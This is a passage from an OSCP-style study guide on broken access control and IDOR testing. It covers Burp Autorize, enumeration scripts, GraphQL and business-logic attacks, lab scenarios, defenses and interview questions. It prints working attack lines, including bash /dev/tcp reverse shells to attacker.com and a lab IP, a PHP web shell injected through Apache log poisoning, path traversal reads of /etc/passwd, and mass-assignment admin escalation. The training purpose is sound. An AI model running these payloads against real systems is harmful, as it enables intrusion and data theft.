  "permissions": ["read", "write", "delete", "admin"]
}
```

### 10.4 Function-Level Access → RCE

**Attack Chain**:
```
1. Discover unprotected admin endpoint
   POST /admin/execute_command

2. Send command injection payload
   POST /admin/execute_command
   {"cmd": "whoami"}

3. Escalate to reverse shell
   {"cmd": "bash -i >& /dev/tcp/attacker.com/4444 0>&1"}
```

---

## 11. Automation: Burp Autorize & AutoRepeater

### 11.1 Burp Autorize Setup

**Installation**:
```
1. Burp Suite → Extender → BApp Store
2. Search "Autorize"
3. Install
4. Go to "Autorize" tab
```

**Configuration**:
```
1. Login as Low-Privilege User (User A)
2. Copy session cookie: session=abc123
3. Autorize tab → Configuration
4. Paste cookie in "Header Injection" field:
   Cookie: session=abc123
5. Click "Autorize is ON"
```

**Usage**:
```
1. Login as Admin/High-Privilege User in browser
2. Browse the application (click all admin links)
3. Autorize automatically:
   - Intercepts each request
   - Replays it with Low-Priv session
   - Compares responses
4. Results:
   - Green (200 OK) = VULNERABLE (low-priv user accessed admin function)
   - Red (403/401) = Secure
```

**Example Output**:
```
Original Request (Admin):
  POST /admin/delete_user HTTP/1.1
  Cookie: session=admin_session_xyz
  Response: 200 OK

Autorize Modified Request (User A):
  POST /admin/delete_user HTTP/1.1
  Cookie: session=abc123  ← Replaced
  Response: 200 OK  ← VULNERABLE! User A can delete users!
```

### 11.2 AutoRepeater

**Installation**: Burp BApp Store → AutoRepeater

**Use Case**: Test parameter tampering at scale.

**Configuration**:
```
1. Define replacement rules:
   - Replace "user_id=100" with "user_id=101"
   - Replace "role=user" with "role=admin"
   
2. Send requests to AutoRepeater
3. It automatically creates multiple tabs with variations
```

### 11.3 Custom Python Script for IDOR Testing

```python
#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor

# Configuration
BASE_URL = "https://target.com/api/documents"
SESSION_COOKIE = "session=attacker_session"
START_ID = 1
END_ID = 1000

def test_idor(doc_id):
    """Test IDOR for a single document ID"""
    url = f"{BASE_URL}/{doc_id}"
    cookies = {"session": SESSION_COOKIE}
    
    try:
        r = requests.get(url, cookies=cookies, timeout=5)
        
        if r.status_code == 200:
            print(f"[VULN] Document {doc_id} accessible: {r.json()}")
            return (doc_id, "vulnerable", r.text[:100])
        elif r.status_code == 403:
            return (doc_id, "secure", None)
        elif r.status_code == 404:
            return (doc_id, "not_found", None)
        else:
            return (doc_id, f"status_{r.status_code}", None)
    except Exception as e:
        return (doc_id, "error", str(e))

def main():
    print(f"[*] Testing IDOR from ID {START_ID} to {END_ID}")
    
    # Multithreaded testing
    with ThreadPoolExecutor(max_workers=10) as executor:
        results = executor.map(test_idor, range(START_ID, END_ID + 1))
    
    # Summarize
    vuln_count = sum(1 for _, status, _ in results if status == "vulnerable")
    print(f"\n[*] Found {vuln_count} vulnerable documents")

if __name__ == "__main__":
    main()
```

**Usage**:
```bash
python3 idor_scanner.py

# Output:
# [*] Testing IDOR from ID 1 to 1000
# [VULN] Document 55 accessible: {"title": "Secret Report", "owner": "Bob"}
# [VULN] Document 123 accessible: {"title": "Financial Data", "owner": "Alice"}
# [*] Found 37 vulnerable documents
```

---

## 12. Manual Testing Workflows

### 12.1 OSCP Time-Efficient Workflow (15 minutes)

**Phase 1: Quick Wins (5 min)**
```bash
# 1. Check admin endpoints
curl -s https://target.com/admin -b "session=user"
curl -s https://target.com/api/admin/users -b "session=user"

# 2. Test obvious IDOR
# If you see /profile?id=5, try id=1,2,3,4,6,7
for i in {1..10}; do
  curl -s "https://target.com/profile?id=$i" -b "session=user" | grep -i "email\|username"
done

# 3. Method tampering
curl -X POST https://target.com/admin -b "session=user"
curl -X PUT https://target.com/admin -b "session=user"
```

**Phase 2: Systematic Testing (10 min)**
```bash
# 1. Create resource as User B
curl -X POST https://target.com/api/notes \
  -b "session=user_b" \
  -d "title=Secret&content=Confidential" \
  -o response.json

# Extract ID from response
NOTE_ID=$(jq -r '.id' response.json)

# 2. Try to access as User A
curl https://target.com/api/notes/$NOTE_ID \
  -b "session=user_a"

# 3. Try to modify/delete as User A
curl -X DELETE https://target.com/api/notes/$NOTE_ID \
  -b "session=user_a"
```

### 12.2 Comprehensive Testing (Bug Bounty)

**Phase 1: Enumeration (30 min)**
```bash
# 1. Discover all endpoints
gospider -s https://target.com -o endpoints
cat endpoints/* | grep -Eo "https://target.com[^\"' ]+" | sort -u > urls.txt

# 2. Identify dynamic parameters
cat urls.txt | grep "id=" > id_params.txt
cat urls.txt | grep "user=" >> id_params.txt

# 3. Test each parameter
while read url; do
  # Extract ID value
  original_id=$(echo "$url" | grep -oP '(?<=id=)[^&]+')
  
  # Try different IDs
  for new_id in $((original_id - 1)) $((original_id + 1)) 1 999; do
    modified_url=$(echo "$url" | sed "s/id=$original_id/id=$new_id/")
    curl -s "$modified_url" -b "session=attacker" -o "test_$new_id.html"
  done
done < id_params.txt
```

**Phase 2: Deep Analysis (60 min)**
```bash
# 1. Test all HTTP methods
for method in GET POST PUT DELETE PATCH HEAD OPTIONS; do
  curl -X $method https://target.com/api/users/123 \
       -b "session=user" \
       -H "Content-Type: application/json" \
       -d '{"role": "admin"}'
done

# 2. Test parameter pollution
curl "https://target.com/api/user?id=100&id=200" -b "session=user"

# 3. Test array injection
curl https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"ids": [100, 101, 102, 200, 201]}'  # Mix own and others' IDs

# 4. Test encoded IDs
echo "100" | base64  # MTAw
curl "https://target.com/api/user?id=MTAw" -b "session=user"
```

---

## 13. API Security & Access Control

### 13.1 REST API IDOR

**Common Vulnerable Patterns**:

```
GET    /api/users/123           → Read user 123
PUT    /api/users/123           → Update user 123
DELETE /api/users/123           → Delete user 123
GET    /api/orders/456          → Read order 456
POST   /api/documents           → Create document
       {"owner_id": 789}        → Set owner to arbitrary user!
```

**Testing Script**:
```python
import requests

BASE = "https://api.target.com"
USER_A_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
USER_B_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

def test_rest_idor():
    # User B creates a resource
    headers_b = {"Authorization": f"Bearer {USER_B_TOKEN}"}
    r = requests.post(f"{BASE}/api/notes", 
                      json={"title": "Secret"}, 
                      headers=headers_b)
    note_id = r.json()['id']
    print(f"User B created note {note_id}")
    
    # User A tries to read it
    headers_a = {"Authorization": f"Bearer {USER_A_TOKEN}"}
    r = requests.get(f"{BASE}/api/notes/{note_id}", headers=headers_a)
    
    if r.status_code == 200:
        print(f"[VULN] User A read User B's note: {r.json()}")
    else:
        print(f"[SECURE] Got {r.status_code}")

test_rest_idor()
```

### 13.2 GraphQL Access Control

**GraphQL IDOR Issues**:

**Vulnerable Query**:
```graphql
query {
  user(id: "123") {
    email
    privateNotes
    ssn
  }
}
```

**Attack**:
```graphql
query {
  user(id: "456") {  # Victim's ID
    email
    privateNotes
    ssn
  }
}
```

**Batch Query Attack**:
```graphql
query {
  user1: user(id: "100") { email ssn }
  user2: user(id: "101") { email ssn }
  user3: user(id: "102") { email ssn }
  # ... enumerate 100+ users in one request
}
```

**Defense**:
```javascript
// Resolver with authorization
const resolvers = {
  Query: {
    user: async (parent, { id }, context) => {
      // Check if authenticated
      if (!context.user) {
        throw new Error('Not authenticated');
      }
      
      // Check if authorized
      if (context.user.id !== id && context.user.role !== 'admin') {
        throw new Error('Not authorized');
      }
      
      return getUserById(id);
    }
  }
};
```

### 13.3 API Versioning Issues

**Problem**: Old API versions may lack security fixes.

**Example**:
```bash
# v2 has access control
GET /api/v2/users/123 → 403 Forbidden

# v1 doesn't (forgotten legacy endpoint)
GET /api/v1/users/123 → 200 OK (vulnerable!)
```

**Testing**:
```bash
# Test all API versions
for version in v1 v2 v3 beta alpha; do
  curl "https://target.com/api/$version/users/123" -b "session=user"
done
```

---

## 14. GraphQL Access Control Issues

### 14.1 Introspection for Endpoint Discovery

```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

**Response reveals all available queries**:
```json
{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "Query",
          "fields": [
            {"name": "users"},
            {"name": "adminPanel"},  ← Hidden endpoint!
            {"name": "internalLogs"}
          ]
        }
      ]
    }
  }
}
```

### 14.2 Nested Query IDOR

```graphql
query {
  post(id: "public_post_id") {
    title
    author {
      email          # Should author's email be public?
      privateNotes   # Definitely not public!
      ssn
    }
  }
}
```

---

## 15. Business Logic Flaws

### 15.1 Coupon Reuse

**Scenario**: E-commerce allows one-time coupon codes.

**Attack**:
```http
POST /api/checkout
{
  "cart_total": 100,
  "coupon": "SAVE50"  # 50% off
}

# Server applies discount: total = $50
# User completes order

# Attack: Reuse same coupon
POST /api/checkout
{
  "cart_total": 200,
  "coupon": "SAVE50"  # Same coupon again!
}
```

### 15.2 Referral Fraud

**Scenario**: Get $10 for each friend referred.

**Attack**:
```bash
# Create 100 fake accounts, all referred by attacker
for i in {1..100}; do
  curl -X POST https://target.com/register \
    -d "email=fake$i@temp.com&referrer=attacker_id"
done

# Attacker gets $1,000 in credits
```

### 15.3 Negative Quantity

**Scenario**: Checkout system.

**Attack**:
```http
POST /api/checkout
{
  "items": [
    {"product_id": 1, "quantity": 1, "price": 100},
    {"product_id": 2, "quantity": -10, "price": 5}
  ]
}

# Total: (1 * 100) + (-10 * 5) = 100 - 50 = $50
# Attacker pays less by adding negative quantity items
```

---

## 16. OSCP Attack Scenarios

### Scenario 1: File Download IDOR → LFI → Shell

**Target**: `http://192.168.50.10/download.php?file=report.pdf`

**Step 1: Test IDOR**
```bash
# Try path traversal
curl "http://192.168.50.10/download.php?file=../../../../etc/passwd"

# Success! LFI vulnerability
```

**Step 2: Read web files**
```bash
# Find web root
curl "http://192.168.50.10/download.php?file=../../../../var/www/html/index.php"

# Find config
curl "http://192.168.50.10/download.php?file=../../../../var/www/html/config.php"
```

**Step 3: Log poisoning → RCE**
```bash
# Poison Apache access log
curl -A "<?php system(\$_GET['cmd']); ?>" http://192.168.50.10/

# Include log file
curl "http://192.168.50.10/download.php?file=../../../../var/log/apache2/access.log&cmd=whoami"

# Reverse shell
PAYLOAD="bash -c 'bash -i >& /dev/tcp/192.168.45.5/4444 0>&1'"
curl "http://192.168.50.10/download.php?file=../../../var/log/apache2/access.log&cmd=$PAYLOAD"
```

### Scenario 2: API IDOR → Admin Token → Privilege Escalation

**Target**: `http://192.168.50.20/api`

**Step 1: Enumerate users**
```bash
for i in {1..100}; do
  curl -s "http://192.168.50.20/api/users/$i" \
    -H "Authorization: Bearer USER_TOKEN" \
    | jq -r '.username, .role'
done

# Found: User ID 1 is "admin"
```

**Step 2: Try to access admin token**
```bash
curl "http://192.168.50.20/api/users/1/token" \
  -H "Authorization: Bearer USER_TOKEN"

# Response: {"api_token": "admin_secret_token_xyz"}
# IDOR vulnerability!
```

**Step 3: Use admin token**
```bash
curl -X POST "http://192.168.50.20/api/admin/execute" \
  -H "Authorization: Bearer admin_secret_token_xyz" \
  -d '{"command": "cat /root/proof.txt"}'

# Response: {"output": "a1b2c3d4e5f6..."}
```

### Scenario 3: Mass Assignment → Admin Role

**Target**: User registration at `http://192.168.50.30/register`

**Step 1: Normal registration**
```bash
curl -X POST http://192.168.50.30/api/register \
  -H "Content-Type: application/json" \
  -d '{"username": "test", "password": "test123"}'

# Response: {"user_id": 50, "role": "user"}
```

**Step 2: Test mass assignment**
```bash
curl -X POST http://192.168.50.30/api/register \
  -H "Content-Type: application/json" \
  -d '{"username": "hacker", "password": "test123", "role": "admin", "is_verified": true}'

# Response: {"user_id": 51, "role": "admin"}
# Success! Mass assignment vulnerability
```

**Step 3: Access admin panel**
```bash
# Login as newly created admin
curl -X POST http://192.168.50.30/api/login \
  -d "username=hacker&password=test123" \
  -c cookies.txt

# Access admin functions
curl http://192.168.50.30/admin/flag \
  -b cookies.txt

# Response: {"flag": "OSCP{...}"}
```

---

## 17. Defense Strategies

### 17.1 Implement Centralized Access Control

**Bad (Scattered Checks)**:
```python
# In 50 different functions:
def get_invoice(id):
    invoice = Invoice.get(id)
    if invoice.owner_id != current_user.id:  # Easy to forget
        abort(403)
    return invoice
```

**Good (Centralized Middleware)**:
```python
# Decorator for ownership check
def require_ownership(model_class):
    def decorator(func):
        @wraps(func)
        def wrapper(resource_id, *args, **kwargs):
            resource = model_class.get(resource_id)
            if resource.owner_id != current_user.id:
                abort(403)
            return func(resource_id, *args, **kwargs)
        return wrapper
    return decorator

# Usage (can't forget to add decorator)
@app.route('/invoices/<id>')
@require_ownership(Invoice)
def get_invoice(id):
    return Invoice.get(id).to_json()
```

### 17.2 Use Indirect References

**Bad (Direct Database IDs)**:
```
GET /api/orders/12345  ← Database primary key exposed
```

**Good (Indirect Reference Map)**:
```python
# Generate temporary reference
def create_reference_map(user_id):
    user_resources = Order.filter(owner_id=user_id)
    session['resource_map'] = {
        f'ref_{i}': resource.id 
        for i, resource in enumerate(user_resources)
    }

# Client sees:
# GET /api/orders/ref_0, /api/orders/ref_1
# Server translates ref_0 → real ID 12345

# Attacker can't guess ref_999 because it doesn't exist in their map
```

### 17.3 Deny by Default

```python
# Wrong: Allow by default
def check_permission(user, resource):
    if user.is_admin() or resource.is_public():
        return True
    # If no rule matches, accidentally returns None (truthy)

# Right: Deny by default
def check_permission(user, resource):
    # Explicit allow rules
    if user.is_admin():
        return True
    if resource.is_public():
        return True
    if resource.owner_id == user.id:
        return True
    
    # Explicit deny
    return False
```

### 17.4 Log Access Attempts

```python
import logging

def access_resource(user_id, resource_id):
    resource = Resource.get(resource_id)
    
    if resource.owner_id != user_id:
        # Log unauthorized attempt
        logging.warning(
            f"UNAUTHORIZED ACCESS ATTEMPT: "
            f"User {user_id} tried to access resource {resource_id} "
            f"owned by {resource.owner_id}"
        )
        abort(403)
    
    return resource
```

**Monitoring**:
```bash
# Alert on repeated unauthorized attempts
awk '/UNAUTHORIZED ACCESS ATTEMPT/ {print $0}' app.log \
  | awk '{count[$5]++} END {for(user in count) if(count[user] > 10) print user, count[user]}'
```

### 17.5 Rate Limiting for Enumeration

```python
from flask_limiter import Limiter

limiter = Limiter(app, key_func=lambda: current_user.id)

@app.route('/api/users/<id>')
@limiter.limit("100 per hour")  # Prevent mass enumeration
def get_user(id):
    # ...
```

---

## 18. Common Pitfalls

### Pitfall 1: Trusting Client-Side Validation

```javascript
// Frontend (JavaScript - can be bypassed!)
function updateProfile() {
    if (currentUser.id !== profileId) {
        alert("You can only edit your own profile!");
        return;  // Attacker just disables this in DevTools
    }
    fetch('/api/profile', {method: 'PUT', body: profileData});
}

// Backend MUST also validate!
```

### Pitfall 2: Checking Authentication, Not Authorization

```python
# Wrong
@app.route('/admin/delete/<user_id>')
@login_required  # Only checks if logged in!
def delete_user(user_id):
    User.delete(user_id)

# Right
@app.route('/admin/delete/<user_id>')
@require_admin  # Checks role
def delete_user(user_id):
    User.delete(user_id)
```

### Pitfall 3: GUID False Sense of Security

```
"We use UUIDs, so it's secure."
→ UUIDs leak in API responses, logs, shared links
→ Still need authorization checks!
```

### Pitfall 4: Obscurity ≠ Security

```
"We don't link to /admin, so users won't find it."
→ Attackers use wordlists, crawlers, Wayback Machine
→ Security through obscurity fails
```

### Pitfall 5: Forgetting API Endpoints

```
Web UI: Protected with CSRF tokens, session checks
API:    No protection (forgot to add auth)

→ Attacker bypasses UI and calls API directly
```

---

## 19. Hands-on Exercises

### Exercise 1: Basic IDOR Detection

**Setup**:
1. Deploy DVWA or bWAPP
2. Create two user accounts
3. Find IDOR in user profiles

**Tasks**:
- [ ] User A views their own profile
- [ ] User A modifies URL to view User B's profile
- [ ] Document the vulnerable endpoint
- [ ] Fix the vulnerability

### Exercise 2: Burp Autorize Lab

**Setup**:
1. Install Burp Suite + Autorize extension
2. Use http://testphp.vulnweb.com or similar

**Tasks**:
- [ ] Configure Autorize with low-privilege session
- [ ] Browse as admin (or use provided admin account)
- [ ] Identify 3+ vulnerable endpoints
- [ ] Write report with evidence

### Exercise 3: Mass Assignment Exploitation

**Vulnerable Code** (deploy locally):
```python
from flask import Flask, request, jsonify

app = Flask(__name__)
users = {}

@app.route('/register', methods=['POST'])
def register():
    user_data = request.json
    user_id = len(users) + 1
    users[user_id] = user_data  # Vulnerable!
    return jsonify({"id": user_id, "user": users[user_id]})

if __name__ == '__main__':
    app.run(debug=True)
```

**Tasks**:
- [ ] Register normally: `{"username": "alice", "email": "alice@test.com"}`
- [ ] Attempt privilege escalation: Add `"role": "admin", "balance": 1000000`
- [ ] Verify the attack worked
- [ ] Fix the code to use allowlisting

### Exercise 4: OSCP-Style Challenge

**Scenario**: Web app at `http://target.local`

**Given**:
- Regular user credentials: `user:password123`
- Suspected admin panel exists
- File download feature at `/download?file=...`

**Objectives**:
- [ ] Find and exploit IDOR in file download (LFI)
- [ ] Read `/etc/passwd`
- [ ] Discover admin endpoints
- [ ] Achieve privilege escalation
- [ ] Read `/root/proof.txt`

**Time Limit**: 30 minutes (OSCP simulation)

---

## 20. Interview Questions

**Q1: What's the difference between authentication and authorization?**

**A**: Authentication verifies *who you are* (identity), typically via username/password. Authorization determines *what you can do* (permissions), like whether you can access a specific resource. Example: Logging into Facebook is authentication; being able to view your friend's private photos (but not a stranger's) is authorization.

---

**Q2: Explain IDOR with a real-world example.**

**A**: IDOR (Insecure Direct Object Reference) is when an application exposes a reference to an internal object (database ID, file name) without checking permissions. Example: Bank website URL `https://bank.com/accounts?id=12345` shows your account. If you change `id=12346` and see someone else's account, that's IDOR. The server should check "Does this user own account 12346?" before returning data.

---

**Q3: What is mass assignment and how do you prevent it?**

**A**: Mass assignment is when a framework automatically binds HTTP parameters to object properties. Attack: During registration, attacker sends `{"username": "bob", "role": "admin"}` and the framework sets both fields, making Bob an admin. 

**Prevention**: Use allowlisting—explicitly define which fields can be set. Example in Rails: `params.require(:user).permit(:username, :email)` (excludes `role`).

---

**Q4: How would you test for broken access control during a pentest?**

**A**: 
1. Create three accounts: User A (attacker), User B (victim), Admin
2. As User B, create a resource (note ID: 100)
3. As User A, try to access note 100
4. Test all HTTP methods (GET, POST, PUT, DELETE)
5. Test admin endpoints with User A's session
6. Use tools like Burp Autorize to automate testing
7. Look for parameter tampering opportunities (`role=admin`)

---

**Q5: What's the OWASP recommendation for fixing access control issues?**

**A**: 
1. **Deny by default**: Require explicit permission grants
2. **Centralize access control**: Use middleware/decorators, not scattered checks
3. **Never trust client input**: Validate on server, not just client
4. **Log and monitor**: Alert on repeated unauthorized attempts
5. **Use indirect references**: Don't expose database IDs
6. **Minimize CORS**: Restrict API access

---

**Q6: Can UUIDs/GUIDs prevent IDOR?**

**A**: **No**. While UUIDs are hard to guess (2^128 possibilities), they often leak through:
- API responses (friend lists, public profiles)
- Shared links
- Browser history/logs
- Error messages

**UUIDs are a layer of defense (obscurity) but NOT a substitute for proper authorization checks.** Always validate ownership regardless of ID type.

---

**Q7: Describe a privilege escalation attack chain involving IDOR.**

**A**:
1. IDOR to enumerate users: `GET /api/users/1, 2, 3...` finds admin ID = 1
2. IDOR to read admin's API token: `GET /api/users/1/token` → `{"token": "xyz"}`
3. Use admin token: `PUT /api/users/attacker_id` with header `Authorization: xyz`
4. Set own role to admin: `{"role": "administrator"}`
5. Now attacker has full admin access

---

**Q8: What's the security risk of exposing database primary keys?**

**A**:
1. **Sequential IDs leak business info**: Order #12345 today, #12500 tomorrow = 155 daily orders
2. **Easy enumeration**: Iterate through all IDs to dump data
3. **No security margin**: Attacker can test every possible ID
4. **Persistent**: IDs don't rotate, so vulnerability persists

**Better**: Use indirect references (session-scoped maps) or UUIDs + proper authz.

---

**Q9: How does mass assignment differ from IDOR?**

**A**:
- **IDOR**: Changing *which* resource is accessed (`id=100` → `id=101`)
- **Mass Assignment**: Changing *what fields* are set (`{"email": "..."}` → `{"email": "...", "role": "admin"}`)

Both are access control issues, but IDOR is about horizontal/vertical escalation, while mass assignment is about field-level authorization.

---

**Q10: What tools would you use to detect broken access control at scale?**

**A**:
1. **Burp Suite**: Autorize extension, Repeater, Intruder
2. **OWASP ZAP**: Access Control Testing plugin
3. **Custom scripts**: Python (requests) for API testing
4. **ffuf/gobuster**: Endpoint discovery
5. **Postman/Insomnia**: API testing with different user contexts
6. **JWT.io**: Decode JWTs to find tamperable fields

---

## 21. Summary & Key Takeaways

### Critical Concepts

1. **Authentication ≠ Authorization**
   - Authentication: "Who are you?"
   - Authorization: "What can you access?"
   - BOTH are required for security

2. **IDOR is #1 in OWASP Top 10**
   - Cannot be detected by scanners alone
   - Requires business logic understanding
   - Present in 94% of applications

3. **Testing Requires Multiple Users**
   - User A (attacker)
   - User B (victim, same privilege level)
   - Admin (elevated privilege)

4. **Never Trust Client Input**
   - IDs in URLs, JSON bodies, headers—all can be tampered
   - Always validate ownership on server

5. **Obscurity ≠ Security**
   - UUIDs, hidden endpoints, complex URLs don't replace authorization
   - Assume attackers will find all endpoints

### OSCP Exam Tips

1. **Allocate 15-30 minutes** per machine for access control testing
2. **Always test**:
   - Path traversal in file parameters
   - IDOR in numeric IDs
   - Admin endpoints
   - HTTP method tampering
   - Mass assignment in registration/profile updates

3. **Common OSCP chains**:
   - IDOR + LFI → RCE (via log poisoning)
   - Mass assignment → Admin role → Command execution
   - API IDOR → Admin token → Privilege escalation

4. **Quick wins**:
   ```bash
   # Test these immediately
   curl /admin
   curl /api/admin/users
   curl /download?file=../../../../etc/passwd
   ```

### Defense Checklist

- [ ] Implement centralized access control (middleware/decorators)
- [ ] Deny by default (require explicit permission grants)
- [ ] Never expose database primary keys (use indirect references)
- [ ] Validate authorization on EVERY request
- [ ] Use allowlisting for mass assignment protection
- [ ] Log unauthorized access attempts
- [ ] Rate limit to prevent enumeration
- [ ] Test with multiple user contexts before deployment

### Red Flags to Look For

```
🚩 Sequential IDs in URLs (/users/1, /users/2...)
🚩 "Security" relies on UI hiding admin buttons
🚩 Framework mass assignment without allowlisting
🚩 No ownership checks in API endpoints
🚩 Different behavior for GET vs POST on same endpoint
🚩 UUID in response bodies or public URLs
🚩 Error messages revealing other users' IDs
```

---

## 22. References & Further Reading

### OWASP Resources
- [OWASP Top 10 2021 - A01 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [OWASP Testing Guide - Testing for IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)

### Tools
- [Burp Suite Autorize Extension](https://portswigger.net/bappstore/f9bbac8c4acf4aefa4d7dc92a991af2f)
- [OWASP ZAP](https://www.zaproxy.org/)
- [Postman](https://www.postman.com/)

### Practice Labs
- [PortSwigger Web Security Academy - Access Control](https://portswigger.net/web-security/access-control)
- [HackTheBox - Academy Modules](https://academy.hackthebox.com/)
- [PentesterLab - Access Control Exercises](https://pentesterlab.com/)
- [DVWA (Damn Vulnerable Web Application)](https://github.com/digininja/DVWA)

### Related Topics
- [[02_OWASP_Top_10_Modern]] - OWASP Top 10 comprehensive coverage
- [[06_Authentication_Session_Mgmt]] - Session security
- [[04_XSS_Client_Side_Attacks]] - Client-side exploitation
- [[07_Server_Side_Request_Forgery]] - SSRF attacks

### Bug Bounty Reports (Real Examples)
- [HackerOne Disclosed Reports - IDOR](https://hackerone.com/hacktivity?querystring=IDOR)
- [IDOR to Account Takeover Collection](https://pentester.land/cheatsheets/2018/10/12/idor-cheat-sheet.html)

---

**END OF DOCUMENT** - Version 3.0 - Last Updated: 2026-01-24

**Total Lines**: ~1,900 lines | **OSCP Relevance**: CRITICAL (90%) | **Difficulty**: Intermediate to Advanced
